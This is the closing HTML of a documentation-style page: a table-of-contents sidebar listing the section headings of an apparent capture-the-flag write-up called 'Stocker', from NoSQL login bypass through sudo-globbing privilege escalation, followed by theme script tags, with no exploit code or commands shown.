        <div class="toc-title-container">
          <span class="toc-title">
            On this page
          </span>
        </div>
        <div class="toc-tree-container">
          <div class="toc-tree">
            <ul>
<li><a class="reference internal" href="#">Stocker</a><ul>
<li><a class="reference internal" href="#enum">Enum</a></li>
<li><a class="reference internal" href="#nosql-login-bypass">NoSQL login bypass</a></li>
<li><a class="reference internal" href="#enum-again">Enum again</a></li>
<li><a class="reference internal" href="#server-side-xss">Server Side XSS</a></li>
<li><a class="reference internal" href="#xss-to-ssrf-arbitrary-file-read">XSS to SSRF / arbitrary file read</a></li>
<li><a class="reference internal" href="#credential-reuse">Credential reuse</a></li>
<li><a class="reference internal" href="#privesc-enum">Privesc enum</a></li>
<li><a class="reference internal" href="#code-execution-as-root-due-to-globing-in-the-sudo-line">Code execution as root due to globing in the sudo line</a></li>
</ul>
</li>
</ul>

          </div>
        </div>
      </div>
      
      
    </aside>
  </div>
</div><script data-url_root="../../../../" id="documentation_options" src="../../../../_static/documentation_options.js?v=b3ba4146"></script>
    <script src="../../../../_static/doctools.js?v=888ff710"></script>
    <script src="../../../../_static/sphinx_highlight.js?v=4825356b"></script>
    <script src="../../../../_static/scripts/furo.js?v=32e29ea5"></script>
    </body>
</html>